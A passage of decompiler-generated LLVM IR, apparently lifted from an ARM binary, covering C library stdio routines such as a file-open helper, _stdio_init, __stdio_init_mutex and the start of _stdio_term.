dec_label_pc_fe10:                                ; preds = %.thread4, %dec_label_pc_fdf4
  %v0_fe68 = phi i32 [ %v0_fd6c, %.thread4 ], [ %v0_fe10.pre, %dec_label_pc_fdf4 ]
  %v1_fe10 = icmp slt i32 %v0_fe68, 0
  %v2_fe10 = icmp eq i32 %v0_fe68, 0
  store i1 %v2_fe10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_fe10, label %dec_label_pc_fe68, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe10
  %v0_fe1c = load i32, i32* @r4, align 4
  %v2_fe1c = and i32 %v0_fe1c, 131075
  %v1_fe20 = add nuw nsw i32 %v2_fe1c, 1
  store i32 %v1_fe20, i32* %r2.global-to-local, align 4
  %v0_fe24 = load i32, i32* @r6, align 4
  %v1_fe24 = add i32 %v0_fe24, 1
  %v2_fe28 = and i32 %v1_fe24, %v1_fe20
  store i32 %v2_fe28, i32* %r3.global-to-local, align 4
  %v9_fe2c = icmp eq i32 %v2_fe28, %v1_fe20
  store i1 %v9_fe2c, i1* %cpsr_z.global-to-local, align 1
  %v1_fe30 = load i32, i32* @r8, align 4
  %v2_fe30 = add i32 %v1_fe30, 4
  %v3_fe30 = inttoptr i32 %v2_fe30 to i32*
  store i32 %v0_fe68, i32* %v3_fe30, align 4
  br i1 %v9_fe2c, label %dec_label_pc_fe38, label %dec_label_pc_fd8c

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe18
  %v0_fe38 = load i32, i32* @r4, align 4
  %v1_fe38 = load i32, i32* @r6, align 4
  %v2_fe38 = sub i32 -1, %v1_fe38
  %v3_fe38 = and i32 %v0_fe38, %v2_fe38
  store i32 %v3_fe38, i32* %r3.global-to-local, align 4
  %v1_fe3c = and i32 %v3_fe38, 1024
  %v2_fe3c = icmp eq i32 %v1_fe3c, 0
  store i1 %v2_fe3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe3c, label %dec_label_pc_fe5c, label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe38
  %v0_fe44 = load i32, i32* @r5, align 4
  store i32 %v0_fe44, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_fe50 = call i32 @__libc_fcntl(i32 %v0_fe44, i32 4)
  store i32 %v2_fe50, i32* %r0.global-to-local, align 4
  %v2_fe54 = icmp eq i32 %v2_fe50, 0
  store i1 %v2_fe54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe54, label %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge, label %dec_label_pc_fd8c

dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge:    ; preds = %dec_label_pc_fe44
  %v0_fe5c.pre = load i32, i32* @r6, align 4
  %v0_fe60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe5c

dec_label_pc_fe5c:                                ; preds = %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge, %dec_label_pc_fe38
  %v0_fe60 = phi i32 [ %v0_fe60.pre, %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge ], [ %v0_fe38, %dec_label_pc_fe38 ]
  %v0_fe5c = phi i32 [ %v0_fe5c.pre, %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge ], [ %v1_fe38, %dec_label_pc_fe38 ]
  %v1_fe5c = and i32 %v0_fe5c, 131072
  store i32 %v1_fe5c, i32* %r3.global-to-local, align 4
  %v2_fe60 = or i32 %v1_fe5c, %v0_fe60
  store i32 %v2_fe60, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe10
  %v7_fe68 = icmp eq i32 %v0_fe68, -1
  store i1 %v7_fe68, i1* %cpsr_z.global-to-local, align 1
  %v0_fe74.pre = load i32, i32* @r4, align 4
  br i1 %v7_fe68, label %dec_label_pc_fe68._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_fe68
  %v2_fe6c = or i32 %v0_fe74.pre, 131072
  store i32 %v2_fe6c, i32* @r4, align 4
  br label %dec_label_pc_fe68._crit_edge

dec_label_pc_fe68._crit_edge:                     ; preds = %dec_label_pc_fe68, %bb34
  %v0_fe74 = phi i32 [ %v2_fe6c, %bb34 ], [ %v0_fe74.pre, %dec_label_pc_fe68 ]
  %v0_fe70 = load i32, i32* @r6, align 4
  store i32 %v0_fe70, i32* %r0.global-to-local, align 4
  store i32 %v0_fe74, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_fe7c = inttoptr i32 %v0_fe70 to i8*
  %v3_fe7c = call i32 @__libc_open(i8* %v2_fe7c, i32 %v0_fe74)
  store i32 %v3_fe7c, i32* %r0.global-to-local, align 4
  %v1_fe80 = icmp slt i32 %v3_fe7c, 0
  %v2_fe80 = icmp eq i32 %v3_fe7c, 0
  store i1 %v2_fe80, i1* %cpsr_z.global-to-local, align 1
  %v1_fe84 = load i32, i32* @r8, align 4
  %v2_fe84 = add i32 %v1_fe84, 4
  %v3_fe84 = inttoptr i32 %v2_fe84 to i32*
  store i32 %v3_fe7c, i32* %v3_fe84, align 4
  br i1 %v1_fe80, label %dec_label_pc_fda0, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe68._crit_edge, %dec_label_pc_fe5c
  %v0_fe8c = load i32, i32* @r8, align 4
  %v1_fe8c = inttoptr i32 %v0_fe8c to i32*
  %v2_fe8c = load i32, i32* %v1_fe8c, align 4
  %v1_fe90 = and i32 %v2_fe8c, 8192
  store i32 %v1_fe90, i32* %r3.global-to-local, align 4
  %v3_fe941 = udiv i32 %v1_fe90, 256
  store i32 %v3_fe941, i32* %r2.global-to-local, align 4
  %v1_fe98 = trunc i32 %v3_fe941 to i8
  %v3_fe98 = add i32 %v0_fe8c, 1
  %v4_fe98 = inttoptr i32 %v3_fe98 to i8*
  store i8 %v1_fe98, i8* %v4_fe98, align 1
  %v0_fe9c = load i32, i32* %r3.global-to-local, align 4
  %v1_fe9c = trunc i32 %v0_fe9c to i8
  %v2_fe9c = load i32, i32* @r8, align 4
  %v3_fe9c = inttoptr i32 %v2_fe9c to i8*
  store i8 %v1_fe9c, i8* %v3_fe9c, align 1
  %v0_fea0 = load i32, i32* @r4, align 4
  %v1_fea0 = and i32 %v0_fea0, 131072
  store i32 %v1_fea0, i32* %r1.global-to-local, align 4
  %v2_fea0 = icmp eq i32 %v1_fea0, 0
  store i1 %v2_fea0, i1* %cpsr_z.global-to-local, align 1
  %v0_fea4 = load i32, i32* @r8, align 4
  %v1_fea4 = add i32 %v0_fea4, 1
  %v2_fea4 = inttoptr i32 %v1_fea4 to i8*
  %v3_fea4 = load i8, i8* %v2_fea4, align 1
  %v4_fea4 = zext i8 %v3_fea4 to i32
  %v1_fea8 = inttoptr i32 %v0_fea4 to i8*
  %v2_fea8 = load i8, i8* %v1_fea8, align 1
  %v3_fea8 = zext i8 %v2_fea8 to i32
  store i32 %v3_fea8, i32* %r3.global-to-local, align 4
  br i1 %v2_fea0, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_fe8c
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_fe8c, %bb35
  %v0_febc = phi i32 [ 0, %dec_label_pc_fe8c ], [ 32768, %bb35 ]
  %v1_feb0 = and i32 %v0_fea0, 1024
  store i32 %v1_feb0, i32* %r0.global-to-local, align 4
  %v4_feb8 = mul nuw nsw i32 %v4_fea4, 256
  %v5_feb8 = or i32 %v3_fea8, %v4_feb8
  %v2_febc = or i32 %v0_febc, %v1_feb0
  store i32 %v2_febc, i32* %r1.global-to-local, align 4
  %v2_fec4 = or i32 %v5_feb8, %v2_febc
  %v1_feb4 = mul i32 %v0_fea0, 16
  %v1_fec0 = and i32 %v1_feb4, 48
  %v1_fec8 = add nuw nsw i32 %v1_fec0, 16
  %v4_fecc = xor i32 %v1_fec8, 48
  %v5_fecc = or i32 %v2_fec4, %v4_fecc
  store i32 %v5_fecc, i32* %r3.global-to-local, align 4
  %v3_fed019 = udiv i32 %v2_fec4, 256
  store i32 %v3_fed019, i32* %r2.global-to-local, align 4
  %v1_fed4 = trunc i32 %v3_fed019 to i8
  store i8 %v1_fed4, i8* %v2_fea4, align 1
  %v0_fed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fed8 = trunc i32 %v0_fed8 to i8
  %v2_fed8 = load i32, i32* @r8, align 4
  %v3_fed8 = inttoptr i32 %v2_fed8 to i8*
  store i8 %v1_fed8, i8* %v3_fed8, align 1
  %v0_fedc = call i32 @__errno_location()
  store i32 %v0_fedc, i32* %r0.global-to-local, align 4
  %v0_fee0 = load i32, i32* @r8, align 4
  %v1_fee0 = add i32 %v0_fee0, 1
  %v2_fee0 = inttoptr i32 %v1_fee0 to i8*
  %v3_fee0 = load i8, i8* %v2_fee0, align 1
  %v4_fee0 = zext i8 %v3_fee0 to i32
  store i32 %v4_fee0, i32* %r3.global-to-local, align 4
  %v1_fee4 = inttoptr i32 %v0_fee0 to i8*
  %v2_fee4 = load i8, i8* %v1_fee4, align 1
  %v3_fee4 = zext i8 %v2_fee4 to i32
  store i32 %v0_fedc, i32* @r6, align 4
  %v1_feec = add i32 %v0_fee0, 4
  %v2_feec = inttoptr i32 %v1_feec to i32*
  %v3_feec = load i32, i32* %v2_feec, align 4
  store i32 %v3_feec, i32* @r0, align 4
  %v4_fef0 = mul nuw nsw i32 %v4_fee0, 256
  %v5_fef0 = or i32 %v3_fee4, %v4_fef0
  store i32 %v5_fef0, i32* @r4, align 4
  %v1_fef4 = inttoptr i32 %v0_fedc to i32*
  %v2_fef4 = load i32, i32* %v1_fef4, align 4
  store i32 %v2_fef4, i32* @r5, align 4
  %v1_fef8 = call i32 @isatty(i32 %v3_feec)
  store i32 %v1_fef8, i32* %r0.global-to-local, align 4
  %v0_fefc = load i32, i32* @r4, align 4
  %v4_fefc = mul i32 %v1_fef8, 256
  %v5_fefc = or i32 %v0_fefc, %v4_fefc
  store i32 %v5_fefc, i32* @r4, align 4
  %v3_ff00 = sdiv i32 %v5_fefc, 256
  store i32 %v3_ff00, i32* %r3.global-to-local, align 4
  %v1_ff04 = trunc i32 %v3_ff00 to i8
  %v2_ff04 = load i32, i32* @r8, align 4
  %v3_ff04 = add i32 %v2_ff04, 1
  %v4_ff04 = inttoptr i32 %v3_ff04 to i8*
  store i8 %v1_ff04, i8* %v4_ff04, align 1
  %v0_ff08 = load i32, i32* @r4, align 4
  %v1_ff08 = trunc i32 %v0_ff08 to i8
  %v2_ff08 = load i32, i32* @r8, align 4
  %v3_ff08 = inttoptr i32 %v2_ff08 to i8*
  store i8 %v1_ff08, i8* %v3_ff08, align 1
  %v0_ff0c = load i32, i32* @r5, align 4
  %v1_ff0c = load i32, i32* @r6, align 4
  %v2_ff0c = inttoptr i32 %v1_ff0c to i32*
  store i32 %v0_ff0c, i32* %v2_ff0c, align 4
  %v0_ff10 = load i32, i32* @r8, align 4
  %v1_ff10 = add i32 %v0_ff10, 8
  %v2_ff10 = inttoptr i32 %v1_ff10 to i32*
  %v3_ff10 = load i32, i32* %v2_ff10, align 4
  store i32 %v3_ff10, i32* %r3.global-to-local, align 4
  %v2_ff14 = icmp eq i32 %v3_ff10, 0
  store i1 %v2_ff14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff14, label %dec_label_pc_ff1c, label %bb37

dec_label_pc_ff1c:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_ff20 = call i32 @malloc(i32 4096)
  store i32 %v1_ff20, i32* %r0.global-to-local, align 4
  %v2_ff24 = icmp eq i32 %v1_ff20, 0
  store i1 %v2_ff24, i1* %cpsr_z.global-to-local, align 1
  %v1_ff38.pre = load i32, i32* @r8, align 4
  br i1 %v2_ff24, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_ff1c
  %v2_ff3820 = add i32 %v1_ff38.pre, 8
  %v3_ff3821 = inttoptr i32 %v2_ff3820 to i32*
  store i32 0, i32* %v3_ff3821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_ff1c
  %v2_ff28 = inttoptr i32 %v1_ff38.pre to i32*
  %v3_ff28 = load i32, i32* %v2_ff28, align 4
  %v2_ff2c = or i32 %v3_ff28, 16384
  store i32 %v2_ff2c, i32* %r3.global-to-local, align 4
  %v2_ff30 = add i32 %v1_ff20, 4096
  store i32 %v2_ff30, i32* %r2.global-to-local, align 4
  %v4_ff34 = sdiv i32 %v2_ff2c, 256
  store i32 %v4_ff34, i32* %r1.global-to-local, align 4
  %v2_ff38 = add i32 %v1_ff38.pre, 8
  %v3_ff38 = inttoptr i32 %v2_ff38 to i32*
  store i32 %v1_ff20, i32* %v3_ff38, align 4
  %v1_ff3c = load i32, i32* %r2.global-to-local, align 4
  %v2_ff3c = load i32, i32* @r8, align 4
  %v3_ff3c = add i32 %v2_ff3c, 12
  %v4_ff3c = inttoptr i32 %v3_ff3c to i32*
  store i32 %v1_ff3c, i32* %v4_ff3c, align 4
  %v1_ff40 = load i32, i32* %r1.global-to-local, align 4
  %v2_ff40 = trunc i32 %v1_ff40 to i8
  %v3_ff40 = load i32, i32* @r8, align 4
  %v4_ff40 = add i32 %v3_ff40, 1
  %v5_ff40 = inttoptr i32 %v4_ff40 to i8*
  store i8 %v2_ff40, i8* %v5_ff40, align 1
  %v0_ff44.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff44.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_ff44 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff44 = trunc i32 %v1_ff44 to i8
  %v3_ff44 = load i32, i32* @r8, align 4
  %v4_ff44 = inttoptr i32 %v3_ff44 to i8*
  store i8 %v2_ff44, i8* %v4_ff44, align 1
  %v0_ff48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff48.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_ff48 = load i32, i32* @r8, align 4
  %v3_ff48 = add i32 %v2_ff48, 12
  %v4_ff48 = inttoptr i32 %v3_ff48 to i32*
  store i32 %v1_ff20, i32* %v4_ff48, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23204.322 to i32), i32* %r3.global-to-local, align 4
  %v2_ff54 = load i32, i32* @r8, align 4
  %v3_ff54 = add i32 %v2_ff54, 2
  %v4_ff54 = inttoptr i32 %v3_ff54 to i8*
  store i8 0, i8* %v4_ff54, align 1
  %v0_ff58 = load i32, i32* @r8, align 4
  %v1_ff58 = add i32 %v0_ff58, 1
  %v2_ff58 = inttoptr i32 %v1_ff58 to i8*
  %v3_ff58 = load i8, i8* %v2_ff58, align 1
  %v4_ff58 = zext i8 %v3_ff58 to i32
  store i32 %v4_ff58, i32* %r2.global-to-local, align 4
  %v2_ff5c = load i32, i32* @global_var_23204.322, align 4
  store i32 %v2_ff5c, i32* %r1.global-to-local, align 4
  %v1_ff60 = add i32 %v0_ff58, 8
  %v2_ff60 = inttoptr i32 %v1_ff60 to i32*
  %v3_ff60 = load i32, i32* %v2_ff60, align 4
  store i32 %v3_ff60, i32* %r3.global-to-local, align 4
  %v1_ff64 = and i32 %v4_ff58, 32
  %v2_ff64 = icmp eq i32 %v1_ff64, 0
  store i1 %v2_ff64, i1* %cpsr_z.global-to-local, align 1
  %v2_ff68 = add i32 %v0_ff58, 20
  %v3_ff68 = inttoptr i32 %v2_ff68 to i32*
  store i32 %v3_ff60, i32* %v3_ff68, align 4
  %v0_ff6c = load i32, i32* %r0.global-to-local, align 4
  %v1_ff6c = load i32, i32* @r8, align 4
  %v2_ff6c = add i32 %v1_ff6c, 44
  %v3_ff6c = inttoptr i32 %v2_ff6c to i32*
  store i32 %v0_ff6c, i32* %v3_ff6c, align 4
  %v0_ff70 = load i32, i32* %r1.global-to-local, align 4
  %v1_ff70 = load i32, i32* @r8, align 4
  %v2_ff70 = add i32 %v1_ff70, 52
  %v3_ff70 = inttoptr i32 %v2_ff70 to i32*
  store i32 %v0_ff70, i32* %v3_ff70, align 4
  %v0_ff74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff74 = load i32, i32* @r8, align 4
  %v2_ff74 = add i32 %v1_ff74, 24
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 %v0_ff74, i32* %v3_ff74, align 4
  %v0_ff78 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff78 = load i32, i32* @r8, align 4
  %v2_ff78 = add i32 %v1_ff78, 28
  %v3_ff78 = inttoptr i32 %v2_ff78 to i32*
  store i32 %v0_ff78, i32* %v3_ff78, align 4
  %v0_ff7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ff7c = load i32, i32* @r8, align 4
  %v2_ff7c = add i32 %v1_ff7c, 16
  %v3_ff7c = inttoptr i32 %v2_ff7c to i32*
  store i32 %v0_ff7c, i32* %v3_ff7c, align 4
  br i1 %v2_ff64, label %dec_label_pc_10010, label %dec_label_pc_ff84

dec_label_pc_ff84:                                ; preds = %bb37
  %v2_ff84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_ff84, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_231ec.309 to i32), i32* %r2.global-to-local, align 4
  %v1_ff9c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_231ec.309 to i32), i32* %r0.global-to-local, align 4
  %v1_ffac = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_231d4.328 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_fd60, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  %v1_ffc0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_231d4.328 to i32), i32* %r0.global-to-local, align 4
  %v1_ffcc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r2.global-to-local, align 4
  %v2_ffd4 = load i32, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  store i32 %v2_ffd4, i32* %r3.global-to-local, align 4
  store i32 %v2_fd60, i32* @r0, align 4
  %v1_ffdc = load i32, i32* @r8, align 4
  %v2_ffdc = add i32 %v1_ffdc, 32
  %v3_ffdc = inttoptr i32 %v2_ffdc to i32*
  store i32 %v2_ffd4, i32* %v3_ffdc, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_ffe8 = load i32, i32* @r8, align 4
  %v1_ffe8 = load i32, i32* %r2.global-to-local, align 4
  %v2_ffe8 = inttoptr i32 %v1_ffe8 to i32*
  store i32 %v0_ffe8, i32* %v2_ffe8, align 4
  %v1_fff0 = call i32 @__pthread_return_void()
  store i32 %v2_ff84, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 65544, i32* @lr, align 4
  %v1_10004 = call i32 @__pthread_return_void()
  store i32 %v1_10004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010

dec_label_pc_1000c:                               ; preds = %dec_label_pc_fda0, %dec_label_pc_fd8c, %dec_label_pc_fdac
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %bb37, %dec_label_pc_fde4, %dec_label_pc_ff84, %dec_label_pc_1000c
  %v0_10010 = load i32, i32* @r8, align 4
  store i32 %v0_10010, i32* %r0.global-to-local, align 4
  %v2_10018 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10018, i32* @r4, align 4
  store i32 %v6_fd54, i32* @r5, align 4
  store i32 %v9_fd54, i32* @r6, align 4
  store i32 %v15_fd54, i32* @r8, align 4
  ret i32 %v0_10010

; uselistorder directives
  uselistorder i32 %v1_ff38.pre, { 1, 0, 2 }
  uselistorder i32 %v1_ff20, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_ff00, { 1, 0 }
  uselistorder i32 %v3_fe941, { 1, 0 }
  uselistorder i32 %v0_fe74, { 1, 0 }
  uselistorder i1 %v7_fe68, { 1, 0 }
  uselistorder i32 %v1_fe38, { 1, 0 }
  uselistorder i32 %v0_fe38, { 1, 0 }
  uselistorder i32 %v1_fe20, { 1, 0, 2 }
  uselistorder i32 %v1_fdd4, { 1, 0 }
  uselistorder i1 %v7_fd80, { 1, 0 }
  uselistorder i1 %v7_fd74, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10010, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_fe68._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe10, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_fdbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd8c, { 1, 2, 0 }
}

define i32 @"$d.3"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1001c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1001c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1001c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1001c
  %v3_10024 = and i32 %arg4, %arg3
  store i32 %v3_10024, i32* %r0.global-to-local, align 4
  %v2_10028 = trunc i32 %v3_10024 to i16
  %v4_10028 = inttoptr i32 %v3_10024 to i16*
  store i16 %v2_10028, i16* %v4_10028, align 2
  %v5_10028 = load i32, i32* @r6, align 4
  %v6_10028 = load i32, i32* %r0.global-to-local, align 4
  %v7_10028 = sub i32 %v6_10028, %v5_10028
  store i32 %v7_10028, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1001c, %bb
  %v8_10028 = phi i32 [ %tmp, %dec_label_pc_1001c ], [ %v7_10028, %bb ]
  ret i32 %v8_10028

; uselistorder directives
  uselistorder i32 %v3_10024, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1004c = load i32, i32* @r4, align 4
  store i32 %v3_1004c, i32* %stack_var_-24, align 4
  %v9_1004c = load i32, i32* @r6, align 4
  %v0_10050 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_23208.298 to i32), i32* @r4, align 4
  %v3_10058 = load i8, i8* @global_var_23209.334, align 1
  %v4_10058 = zext i8 %v3_10058 to i32
  %v2_1005c = load i8, i8* bitcast (i8** @global_var_23208.298 to i8*), align 4
  %v3_1005c = zext i8 %v2_1005c to i32
  store i32 %v0_10050, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_10068 = mul nuw nsw i32 %v4_10058, 256
  %v5_10068 = or i32 %v3_1005c, %v4_10068
  store i32 %v5_10068, i32* @r6, align 4
  %v1_1006c = inttoptr i32 %v0_10050 to i32*
  %v2_1006c = load i32, i32* %v1_1006c, align 4
  store i32 %v2_1006c, i32* %r8.global-to-local, align 4
  %v1_10070 = call i32 @isatty(i32 0)
  %v1_10074 = sub i32 1, %v1_10070
  %v0_10078 = load i32, i32* @r6, align 4
  %v4_10078 = mul i32 %v1_10074, 256
  %v5_10078 = xor i32 %v4_10078, %v0_10078
  %v3_1007c = load i8, i8* @global_var_23259.335, align 1
  %v4_1007c = zext i8 %v3_1007c to i32
  %v3_10080 = load i8, i8* @global_var_23258.299, align 1
  %v4_10080 = zext i8 %v3_10080 to i32
  %v3_10084 = sdiv i32 %v5_10078, 256
  store i32 1, i32* @r0, align 4
  %v4_1008c = mul nuw nsw i32 %v4_1007c, 256
  %v5_1008c = or i32 %v4_10080, %v4_1008c
  store i32 %v5_1008c, i32* @r5, align 4
  %v1_10090 = trunc i32 %v3_10084 to i8
  store i8 %v1_10090, i8* @global_var_23209.334, align 1
  %v1_10094 = trunc i32 %v0_10078 to i8
  %v2_10094 = load i32, i32* @r4, align 4
  %v3_10094 = inttoptr i32 %v2_10094 to i8*
  store i8 %v1_10094, i8* %v3_10094, align 1
  %v1_10098 = call i32 @isatty(i32 1)
  %v1_1009c = sub i32 1, %v1_10098
  %v0_100a0 = load i32, i32* @r5, align 4
  %v4_100a0 = mul i32 %v1_1009c, 256
  %v5_100a0 = xor i32 %v4_100a0, %v0_100a0
  store i32 %v5_100a0, i32* %r5.global-to-local, align 4
  %v3_100a4 = sdiv i32 %v5_100a0, 256
  %v1_100a8 = trunc i32 %v3_100a4 to i8
  store i8 %v1_100a8, i8* @global_var_23259.335, align 1
  %v0_100ac = load i32, i32* %r8.global-to-local, align 4
  %v1_100ac = load i32, i32* @r7, align 4
  %v2_100ac = inttoptr i32 %v1_100ac to i32*
  store i32 %v0_100ac, i32* %v2_100ac, align 4
  %v0_100b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100b0 = trunc i32 %v0_100b0 to i8
  store i8 %v1_100b0, i8* @global_var_23258.299, align 1
  %v2_100b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_100b4, i32* @r4, align 4
  store i32 %v9_1004c, i32* @r6, align 4
  ret i32 %v1_1009c

; uselistorder directives
  uselistorder i32 %v1_1009c, { 1, 0 }
  uselistorder i32 %v0_10078, { 1, 0 }
  uselistorder i8* @global_var_23258.299, { 1, 0 }
  uselistorder i8* @global_var_23259.335, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_23209.334, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_19ef8.337 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_100c4 = call i32 @memcpy()
  %v0_100c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_100c8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_100c8 = load i32, i32* @sb, align 4
  %v3_100c8 = load i32, i32* @r1, align 4
  %v4_100c8 = inttoptr i32 %v3_100c8 to i32*
  store i32 %v1_100c8, i32* %v4_100c8, align 4
  %v5_100c8 = load i32, i32* @r8, align 4
  %v6_100c8 = load i32, i32* @r1, align 4
  %v7_100c8 = sub i32 %v6_100c8, %v5_100c8
  store i32 %v7_100c8, i32* @r1, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_100c4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_100cc = load i32, i32* @r4, align 4
  store i32 %v3_100cc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_231d4.328 to i32), i32* @r0, align 4
  %v0_100d4 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_231ec.309 to i32), i32* @r0, align 4
  %v0_100dc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_101386 = add i32 %storemerge5, 56
  store i32 %v1_101386, i32* @r5, align 4
  %v2_1013c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_101386, i32* %r0.global-to-local, align 4
  br i1 %v2_1013c8, label %dec_label_pc_10148, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %entry, %dec_label_pc_10128
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 65784, i32* @lr, align 4
  %v1_100f4 = call i32 @__pthread_return_0()
  %v2_100f8 = icmp eq i32 %v1_100f4, 0
  %v0_100fc = load i32, i32* @r5, align 4
  store i32 %v0_100fc, i32* @r0, align 4
  br i1 %v2_100f8, label %dec_label_pc_10128, label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %dec_label_pc_100ec
  %v0_10104 = load i32, i32* @r4, align 4
  %v1_10104 = add i32 %v0_10104, 8
  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  %v3_10104 = load i32, i32* %v2_10104, align 4
  store i32 %v3_10104, i32* %r3.global-to-local, align 4
  %v3_1010c = inttoptr i32 %v0_10104 to i8*
